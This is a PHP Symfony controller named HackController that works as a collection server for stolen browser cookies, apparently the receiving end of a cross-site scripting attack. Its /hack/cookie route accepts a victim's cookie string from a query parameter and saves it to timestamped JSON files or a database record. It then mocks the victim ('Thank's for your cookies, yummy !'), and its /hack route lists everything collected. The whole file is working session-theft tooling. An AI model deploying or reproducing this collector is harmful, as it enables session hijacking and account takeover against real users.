<?php

namespace App\Controller;

use App\Entity\CookieRecord;
use App\Repository\CookieRecordRepository;
use DateTimeImmutable;
use DateTimeZone;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class HackController extends AbstractController
{
    private CookieRecordRepository $cookieRecordRepository;

    /**
     * @param CookieRecordRepository $cookieRecordRepository
     */
    public function __construct(CookieRecordRepository $cookieRecordRepository)
    {
        $this->cookieRecordRepository = $cookieRecordRepository;
    }

    #[Route('/hack', name: 'app_hack')]
    public function index(): Response
    {
        $cookieFileList = scandir('../var/storage');
        array_splice($cookieFileList,0,2);
        $cookieFiles = [];
        foreach($cookieFileList as $c){
            $cookieFiles[] = [
                "createdAt"=>filectime("../var/storage/$c"),
                "name"=>$c
            ];
        }
        return $this->render('hack/index.html.twig', [
            'controller_name' => 'HackController',
            'storedCookies'=>$this->cookieRecordRepository->findAll(),
            "cookieFiles"=>$cookieFiles
        ]);
    }

    #[Route('/hack/cookie', name: 'app_hack_cookies_text')]
    public function grabCookiesToText(Request $request): Response
    {

        $message = "No cookie for me ... ok that's was just a test ...";
        if($request->query->get('cookie') && $request->query->get('output')){

            $result = match($request->query->get('output')){
                "text"=>$this->createTextFile($request->query->get('cookie')),
                "store"=>$this->createRecord($request->query->get('cookie'))
            };

            $message = "Thank's for your cookies, yummy !";

        }

        return $this->render('hack/compromised.html.twig', [
            "message"=>$message
        ]);
    }

    private function formatCookie(string $cookie): array
    {
        $cookieArr = explode("; ",$cookie);
        $cookieFinal = [];

        foreach($cookieArr as $item){
            $itemArr = explode("=",$item);
            $cookieFinal[$itemArr[0]] = $itemArr[1];
        }

        return $cookieFinal;
    }

    private function createTextFile(string $cookie): bool
    {
        $timestamp = (new DateTimeImmutable('now',new DateTimeZone('Europe/Paris')))->getTimestamp();
        file_put_contents("../var/storage/mycookies-$timestamp.json", json_encode($this->formatCookie($cookie)));
        return true;
    }

    private function createRecord(string $cookie): bool
    {
        $record = new CookieRecord($this->formatCookie($cookie));

        $this->cookieRecordRepository->add($record,true);
        return true;
    }

}
